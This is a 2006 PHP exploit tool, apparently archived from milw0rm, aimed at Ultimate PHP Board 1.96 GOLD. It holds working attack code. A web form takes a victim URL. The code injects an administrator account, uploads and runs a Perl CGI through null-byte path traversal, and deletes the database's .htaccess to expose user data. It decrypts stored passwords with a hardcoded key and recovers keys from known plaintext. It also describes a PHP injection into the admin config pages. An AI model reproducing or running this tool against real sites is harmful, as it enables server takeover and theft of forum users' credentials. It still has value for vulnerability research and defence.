<html><head><title>Ultimate PHP Board <= 1.96 GOLD Multiple Vulnerabilities Exploit</title></head><pre>&lt;?php
/*
Advisory:
http://www.kliconsulting.com/users/mbrooks/UPBadvisory.rtf
Vendors site:
http://forum.myupb.com/
Download:
http://fileserv.myupb.com/download.php?url=upb196GOLD.zip
http://prdownloads.sourceforge.net/textmb/upb1.8.2.zip?download
Download Mirror:
http://www.kliconsulting.com/users/mbrooks/upb196GOLD.zip
http://www.kliconsulting.com/users/mbrooks/upb1.8.2.zip
*/
//perl cgi code to inject into vulnerable system:
//payload should start with [NR] and end with #;
$perlPayload=&quot;[NR] use CGI qw(:standard);print header;print \&quot; start \&quot;;print \&quot; 0-day  \&quot;;print \&quot; exploit \&quot;; print \&quot; code  end \&quot;;#&quot;;

$v1_xKey=&quot;wdnyyjinffnruxezrkowkjmtqhvrxvolqqxokuofoqtneltaomowpkfvmmogbayankrnrhmbduzfmpctxiidweripxwglmwrmdscoqyijpkzqqzsuqapfkoshhrtfsssmcfzuffzsfxdwupkzvqnloubrvwzmsxjuoluhatqqyfbyfqonvaosminsxpjqebcuiqggccl&quot;;
//taken from ./textdb.inc.php line 324:

function t_decrypt($text,$key){
    $crypt = &quot;&quot;;
    for($i=0;$i&lt;strlen($text);$i++)
    {
        $i_key = ord(substr($key, $i, 1));
        $i_text = ord(substr($text, $i, 1));
        $n_key = ord(substr($key, $i+1, 1));
        $i_crypt = $i_text + $n_key;
        $i_crypt = $i_crypt - $i_key;
        $crypt .= chr($i_crypt);
    }
    return $crypt;
}


function t_encrypt($text, $key)
{
    $crypt = &quot;&quot;;
    for($i=0;$i&lt;strlen($text);$i++)
    {
//	print $i.&quot;key char:&quot;.substr($key, $i, 1).&quot;&lt;br&gt;&quot;;
        $i_key = ord(substr($key, $i, 1));
  //     print $i.&quot;ikey:&quot;.$i_key.&quot;&lt;br&gt;&quot;;
	$i_text = ord(substr($text, $i, 1));
//	print $i.&quot;itext:&quot;.$i_text.&quot;&lt;br&gt;&quot;;
        $n_key = ord(substr($key, $i+1, 1));
//	print $i.&quot;nkey:&quot;.$n_key.&quot;&lt;br&gt;&quot;;
	
        $i_crypt = $i_text + $i_key;
//	print  $i.&quot;T+K_crypt:&quot;.$i_crypt .&quot;&lt;br&gt;&quot;;
        $i_crypt = $i_crypt - $n_key;
//	print $i.&quot;I-N_crypt:&quot;.$i_crypt.&quot;&lt;br&gt;&quot;;
        $crypt .= chr($i_crypt);

	$offset0=$i_crypt-$i_text;
//	print &quot;key=$i_key - $n_key&lt;br&gt;&quot;;
//	print &quot;offset0:$offset0=$i_crypt-$i_text&lt;br&gt;&quot;;
	$offset=$i_key-$n_key;
	//print &quot;offset:$offset&lt;br&gt;&quot;;
//	$broken=$i_text+$offset;
//	print &quot;broken:&quot;.$broken;	

    }
    return $crypt;
}

function gen_collision($offset, $start){//$start should be a number of an ascii char
   $offset_len=strlen($offset);
   $x=0;
 //  print &quot;len:&quot;.$offset_len.&quot;&lt;br&gt;&quot;;
  // for($x=0;$x&lt;$offset_len;$x++){//$offset as $off_int){
  foreach($offset as $off_char){
	if($x==0){
		$newkey.=chr($start);
		$nextchar=$start;
		$x++;
	}
//	print &quot;next char: $nextchar &quot;.&quot;offset:&quot;.$off_char.&quot;&lt;br&gt;&quot;;
	$tmp=$nextchar - $off_char;
	$newkey.=chr($tmp);
	$nextchar=$tmp;
   }
   return $newkey;
}

function gen_offset($crypt,$text){
	$text_len=strlen($text);
	for($x=0;$x&lt;$text_len;$x++){
//		print &quot;crypt:&quot;.substr($crypt, $x, 1).'text:'.substr($text, $x, 1).'&lt;br&gt;';
		$cry_hex=ord(substr($crypt, $x, 1));
		$txt_hex=ord(substr($text, $x, 1));
		$offset[$x]=$cry_hex - $txt_hex;
		//print &quot;offset&quot;.$offset.&quot;crypt&quot;.$cry_hex.&quot;text&quot;.$txt_hex[x].&quot;&lt;br&gt;&quot;;
	}
	return $offset;//numeric array
}


function http_gpc_send( $method, $host, $port ,$usepath,$cookie=&quot;&quot;, $postdata = &quot;&quot;) {
 $fp = pfsockopen( $host, $port, &amp;$errno, &amp;$errstr, 120 );
 # user-agent name
 $ua = &quot;msnbot/1.0 (+http://search.msn.com/msnbot.htm)&quot;;

 if( !$fp ) {
    print &quot;$errstr ($errno)&lt;br&gt;\nn&quot;;
 } else {
    if( $method == &quot;GET&quot; ) {
        fputs( $fp, &quot;GET $usepath HTTP/1.0\n&quot; );
    }
    else if( $method == &quot;POST&quot; ) {
        fputs( $fp, &quot;POST $usepath HTTP/1.0\n&quot; );
    }
    
    fputs( $fp, &quot;User-Agent: &quot;.$ua.&quot;\n&quot; );
    fputs($fp, &quot;Host: &quot;.$host.&quot;\n&quot;);
    fputs( $fp, &quot;Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\n&quot; );
    fputs( $fp, &quot;Accept-Language: en-us,en;q=0.5\n&quot; );
    fputs( $fp, &quot;Accept-Encoding: gzip,deflate\n&quot; );
    fputs( $fp, &quot;Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\n&quot; );
    fputs( $fp, &quot;Cookie: &quot;.$cookie.&quot;\n&quot; );
   
   if( $method == &quot;POST&quot; ) {
	$strlength = strlen( $postdata );
        fputs( $fp, &quot;Content-type: application/x-www-form-urlencoded\n&quot; );
        fputs( $fp, &quot;Content-length: &quot;.$strlength.&quot;\n\n&quot; );
        fputs( $fp, $postdata.&quot;\n\n&quot;);
    }
    fputs( $fp, &quot;\n\n&quot; );
    
   $output = &quot;&quot;;
   while( !feof( $fp ) ) {
        $output .= fgets( $fp, 1024 );
   }
    fclose( $fp );
 }
 return $output;
 }

function getAdmin($victHost, $victPort, $victPath, $exp_user_env,$exp_pass_env,$exp_id_env){
    $exp_power_env=&quot;3&quot;;//admin
    $InjectUserPost=&quot;u_login=te&quot;.rand().&quot;1&amp;u_email=rew&quot;.rand().&quot;@wfje.com&amp;u_loca=&amp;u_site=&amp;avatar=images%2Favatars%2Fnoavatar.gif&amp;u_icq=&amp;u_aim=&amp;u_msn=&amp;u_sig=s%3C%7E%3E0%3C%7E%3E2006-04-20%5BNR%5D&quot;.$exp_user_env.&quot;%3C%7E%3E&quot;.$exp_pass_env.&quot;%3C%7E%3E&quot;.$exp_power_env.&quot;%3C%7E%3EA%40a.com%3C%7E%3E%3C%7E%3E%3C%7E%3E%3C%7E%3E1%3C%7E%3E%3C%7E%3E%3C%7E%3E%3C%7E%3E%3C%7E%3E13%3C%7E%3E%3C%7E%3E1%3C%7E%3E&quot;.$exp_id_env.&quot;&amp;submit=Submit&quot;;
    http_gpc_send(&quot;POST&quot;, $victHost, $victPort, $victPath.&quot;/register.php&quot;, &quot;&quot;, $InjectUserPost);
}


if(isset($_REQUEST['vict'])){
    $payName=&quot;data&quot;.rand().&quot;.cgi&quot;;//must be .cgi
    $expPost=&quot;u_name=Admin&amp;subject=hey&amp;icon=#!/usr/bin/perl -wT \&quot;&amp;message=$perlPayload&amp;id=/../images/$payName%00&quot;;
    $exp_user_env=&quot;Jockie227&quot;;
    $exp_pass_env=&quot;tZbi}&quot;;
    $exp_power_env=&quot;3&quot;;
    $exp_id_env=4000000000+rand(0,300000000);
    //The script is injecting user into the database;  becase of this the cookie is known before the script even contacts the vulnerable &quot;Ultamate PHP Boar&quot;.  Also note that a time stamp is not needed. 
    $cookie=&quot;user_env=$exp_user_env; pass_env=$exp_pass_env; power_env=$exp_power_env; id_env=$exp_id_env&quot;;

    $url_parsed = parse_url($_REQUEST['vict']);
    if ( empty($url_parsed['scheme']) ) {
        $url_parsed = parse_url('http://'.$url);
    }
    $rtn['url'] = $url_parsed;
    $victPort = $url_parsed[&quot;port&quot;];
    if ( !$port ) {
        $victPort = 80;
    }
    $victPath = $url_parsed[&quot;path&quot;];
    $victHost = $url_parsed[&quot;host&quot;];

    print &quot;&lt;title&gt; Ultamate PHP Board Remote Code EXEC 0-Day &lt;/title&gt;&quot;;
    print &quot;&lt;CENTER&gt;&lt;B&gt;&lt;I&gt;0-day&lt;/I&gt;&lt;/B&gt;&lt;/CENTER&gt;&quot;;

    //injecting user into database,  this information is used to verify session information
    getAdmin($victHost, $victPort, $victPath, $exp_user_env,$exp_pass_env,$exp_id_env);
  //http_gpc_send(&quot;POST&quot;, $victHost, $victPort, $victPath.&quot;/register.php&quot;, &quot;&quot;, $InjectUserPost);

   // http_gpc_send(&quot;GET&quot;, $victHost, $victPort, $victPath.&quot;/open.php?id=../images%00&quot;, $cookie);

    //uploading CGI
    $field=http_gpc_send(&quot;POST&quot;, $victHost, $victPort, $victPath.&quot;/newpost.php?a=1&amp;t=1&amp;page=1&quot;, $cookie, $expPost);
    //making cgi executeable usei &quot;close.php&quot;
    http_gpc_send(&quot;GET&quot;, $victHost, $victPort, $victPath.&quot;/close.php?id=../images/&quot;.$payName.&quot;%00&quot;, $cookie);
    //executing cgi
    $feedBack=http_gpc_send(&quot;GET&quot;,$victHost, $victPort, $victPath.&quot;/images/&quot;.$payName);
    $field = str_replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;, $field);
    $field = str_replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;, $field);
   // print $field;
    print $feedBack;
    exit;
}elseif(isset($_REQUEST['victHTA'])){
    $expPost=&quot;u_name=#&amp;message=#&amp;id=/.htaccess%00&quot;;
    $exp_user_env=&quot;Jockie227&quot;;
    $exp_pass_env=&quot;tZbi}&quot;;
    $exp_power_env=&quot;3&quot;;
    $exp_id_env=4000000000+rand(0,300000000);
    //The script is injecting user into the database;  becase of this the cookie is known before the script even contacts the vulnerable Ultamate PHP Board.  Also note that a time stamp is not needed. 
    $cookie=&quot;user_env=$exp_user_env; pass_env=$exp_pass_env; power_env=$exp_power_env; id_env=$exp_id_env&quot;;

    $url_parsed = parse_url($_REQUEST['victHTA']);
    if ( empty($url_parsed['scheme']) ) {
        $url_parsed = parse_url('http://'.$url);
    }
    $rtn['url'] = $url_parsed;
    $victPort = $url_parsed[&quot;port&quot;];
    if ( !$port ) {
        $victPort = 80;
    }
    $victPath = $url_parsed[&quot;path&quot;];
    $victHost = $url_parsed[&quot;host&quot;];

    //injecting user into database,  this information is used to verify session information
    getAdmin($victHost, $victPort, $victPath, $exp_user_env,$exp_pass_env,$exp_id_env);
    //
    $field=http_gpc_send(&quot;POST&quot;, $victHost, $victPort, $victPath.&quot;/newpost.php?a=1&amp;t=1&amp;page=1&quot;, $cookie, $expPost);
   // $field = str_replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;, $field);
   // $field = str_replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;, $field);
   // print $field;
   print &quot;&lt;script&gt;window.location=\&quot;&quot;.$_REQUEST['victHTA'].&quot;/db/\&quot;;&lt;/script&gt;&quot; ;
    exit;
}else if(isset($_REQUEST['addVict'])){
    $url_parsed = parse_url($_REQUEST['addVict']);
    if ( empty($url_parsed['scheme']) ) {
        $url_parsed = parse_url('http://'.$url);
    }
    $rtn['url'] = $url_parsed;
    $victPort = $url_parsed[&quot;port&quot;];
    if ( !$port ) {
        $victPort = 80;
    }
    $victPath = $url_parsed[&quot;path&quot;];
    $victHost = $url_parsed[&quot;host&quot;];

    $exp_user_env=$_REQUEST[&quot;addName&quot;];
    $exp_pass_env=t_encrypt($_REQUEST[&quot;addPass&quot;],$v1_xKey);
    getAdmin($victHost, $victPort, $victPath, $exp_user_env,$exp_pass_env,4000000000+rand(0,300000000));
    print &quot;&lt;title&gt; Ultamate PHP Board Remote Code EXEC 0-Day &lt;/title&gt;&quot;;
    print &quot;&lt;CENTER&gt;&lt;B&gt; Admin login Name:&quot;.$_REQUEST[&quot;addName&quot;].&quot;&lt;/B&gt;&lt;/CENTER&gt;&quot;;//this exploit code suffers from xss!
    print &quot;&lt;CENTER&gt;&lt;B&gt; Admin login Password:&quot;.$_REQUEST[&quot;addPass&quot;].&quot;&lt;/B&gt;&lt;/CENTER&gt;&quot;;
    exit;
}else if(isset($_REQUEST['decrypt'])){
    print &quot;&lt;I&gt;ecrypted password:&lt;/I&gt;&quot;;
    print &quot;&lt;CENTER&gt;&quot;.$_REQUEST[&quot;decrypt&quot;].&quot;&lt;/CENTER&gt;&quot;;
    print &quot;&lt;B&gt;Decrypted password:&lt;/B&gt;&quot;;
    print &quot;&lt;CENTER&gt;&lt;B&gt;&quot;.t_decrypt($_REQUEST[&quot;decrypt&quot;],$v1_xKey).&quot;&lt;/B&gt;&lt;/CENTER&gt;&quot;;
    exit;
}else if(isset($_REQUEST['encrypt'])){
    print &quot;&lt;I&gt;ecrypted password:&lt;/I&gt;&quot;;
    print &quot;&lt;CENTER&gt;&quot;.$_REQUEST[&quot;encrypt&quot;].&quot;&lt;/CENTER&gt;&quot;;
    print &quot;&lt;B&gt;Decrypted password:&lt;/B&gt;&quot;;
    print &quot;&lt;CENTER&gt;&lt;B&gt;&quot;.t_encrypt($_REQUEST[&quot;encrypt&quot;],$v1_xKey).&quot;&lt;/B&gt;&lt;/CENTER&gt;&quot;;
  //  print get_key(t_encrypt($_REQUEST[&quot;encrypt&quot;],$v1_xKey),$_REQUEST[&quot;encrypt&quot;]);
    exit;
}else if(isset($_REQUEST['cypher'])&amp;&amp;isset($_REQUEST['plain'])){
	$cypher_len=strlen($_REQUEST['cypher']);
	$offset=gen_offset($_REQUEST['cypher'],$_REQUEST['plain']);
	print &quot;Offset:&quot;;
	for($x=0;$x&lt;$cypher_len;$x++){
		print  $offset[$x].':';
	}
	print '&lt;br&gt;';
	$validKeys=0;
	$y=0;
	for($y=255;$y&gt;=0;$y--){
		$newKey[$y]=gen_collision($offset,$y);
		$key_len=strlen($newKey[$y]);
		print &quot;&lt;br&gt;Key:$y  = &quot;;
		for($x=0;$x&lt;=$key_len;$x++){
			print  $newKey[$y][$x];
		}			
		print  &quot;&lt;br&gt;Cypher:&quot;.t_encrypt($_REQUEST['plain'],$newKey[$y]);			
		print &quot;&lt;br&gt;Plain     :&quot;.t_decrypt($_REQUEST['cypher'],$newKey[$y]).&quot;&lt;br&gt;&lt;br&gt;&quot;;
	}
	exit;
}

print &quot;&lt;title&gt; Ultimate PHP Board Remote Code EXEC 0-Day &lt;/title&gt;
    
    &lt;CENTER&gt;&lt;B&gt;&lt;I&gt;0-day&lt;/I&gt;&lt;/B&gt;&lt;/CENTER&gt;
     ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;br&gt;
    &lt;B&gt;&lt;I&gt;Get Admin&lt;/I&gt;&lt;/B&gt;&lt;br&gt;
    &lt;B&gt;Inject an administrative account into UPB:&lt;/B&gt;
    &lt;p&gt;
    &lt;form ACTION=&quot;.$_SERVER['PHP_SELF'].&quot; method=\&quot;post\&quot;&gt; 
    &lt;p&gt;
    Path to attack:&lt;i&gt;(example: http://www.domain.ext/PathToUPB)&lt;/i&gt;&lt;br&gt;
    &lt;input name=\&quot;addVict\&quot; type=\&quot;text\&quot; size=60&gt; &lt;br&gt;
    Inject Name:&lt;br&gt;
    &lt;input name=\&quot;addName\&quot; type=\&quot;text\&quot; size=60&gt; &lt;br&gt;
    Inject Password:&lt;br&gt;
    &lt;input name=\&quot;addPass\&quot; type=\&quot;text\&quot; size=60&gt; &lt;br&gt;
    &lt;p&gt;    
    &lt;input type=\&quot;submit\&quot; value=\&quot;Inject Admin\&quot;&gt;     
    &lt;/form&gt;
    
    &lt;p&gt;
    &lt;B&gt;PHP code injection is possilbe in the admin panel without an exploit.  Both admin_config.php and admin_config2.php can be used to execute PHP by tagging on: '  \&quot;;phpinfo(); \$crap=\&quot;1  ' to any of the config values &lt;/B&gt;( double quotes \&quot; are only used in exploit)&lt;/B&gt;
    &lt;p&gt;  
    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;br&gt;
    &lt;B&gt;&lt;I&gt;Gain Read Access To The Database&lt;/I&gt;&lt;/B&gt;

   &lt;form ACTION=&quot;.$_SERVER['PHP_SELF'].&quot; method=\&quot;post\&quot;&gt; 
    &lt;p&gt;
    Removes  /db/.htaccess to allow access to the remote target's flat file database:&lt;i&gt;(example: http://www.domain.ext/PathToUPB  [no trailing slash]) (user database in /db/users.dat) &lt;/i&gt;&lt;br&gt;&lt;br&gt;
    &lt;input name=\&quot;victHTA\&quot; type=\&quot;text\&quot; size=60&gt; &lt;br&gt;
    &lt;p&gt;    
    &lt;input type=\&quot;submit\&quot; value=\&quot;Attack\&quot;&gt;
    &lt;/form&gt;    
    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;br&gt;
    &lt;B&gt;&lt;I&gt;Crypto&lt;/I&gt;&lt;/B&gt;  
	
   &lt;form ACTION=&quot;.$_SERVER['PHP_SELF'].&quot; method=\&quot;post\&quot;&gt; 
    &lt;p&gt;
    Plain Text Password:&lt;br&gt;
    &lt;input name=\&quot;encrypt\&quot; type=\&quot;text\&quot; size=60&gt; &lt;br&gt;
    &lt;p&gt;    
    &lt;input type=\&quot;submit\&quot; value=\&quot;Encrypt\&quot;&gt;     
    &lt;/form&gt;
    &lt;form ACTION=&quot;.$_SERVER['PHP_SELF'].&quot; method=\&quot;post\&quot;&gt; 
    Encrypted Password:&lt;br&gt;
    &lt;input name=\&quot;decrypt\&quot; type=\&quot;text\&quot; size=60&gt; &lt;br&gt;
    &lt;p&gt;    
    &lt;input type=\&quot;submit\&quot; value=\&quot;Decrypt\&quot;&gt;     
    &lt;/form&gt;
    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;br&gt;  
    &lt;form ACTION=&quot;.$_SERVER['PHP_SELF'].&quot; method=\&quot;post\&quot;&gt; 
    &lt;p&gt;
    Plain Text:&lt;br&gt;
    &lt;input name=\&quot;plain\&quot; type=\&quot;text\&quot; size=60&gt; &lt;br&gt;
    &lt;p&gt;    
    corosponding cypher text:&lt;br&gt;
    &lt;input name=\&quot;cypher\&quot; type=\&quot;text\&quot; size=60&gt; &lt;br&gt;
    &lt;p&gt;    
    &lt;input type=\&quot;submit\&quot; value=\&quot;crack key\&quot;&gt;     
    &lt;/form&gt;
    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;br&gt;
   &lt;B&gt;&lt;I&gt;Proof of Concept Only,  Unstable Remote Code Execution Using NON-SQL Database Injection&lt;/I&gt;&lt;/B&gt;
    &lt;form ACTION=&quot;.$_SERVER['PHP_SELF'].&quot; method=\&quot;post\&quot;&gt; 
    &lt;p&gt;
     perl CGI Code Injection Attack Remote Target:&lt;br&gt;
    &lt;input name=\&quot;vict\&quot; type=\&quot;text\&quot; size=60&gt; &lt;br&gt;
    &lt;p&gt;    
    &lt;input type=\&quot;submit\&quot; value=\&quot;Attack\&quot;&gt;
    &lt;/form&gt;
    
    &lt;B&gt;http://www.domain.ext/PathToUPB  (no trailing slash)&lt;/B&gt;
    &lt;/body&gt;&quot;;
?&gt;

# milw0rm.com [2006-06-20]</pre></html>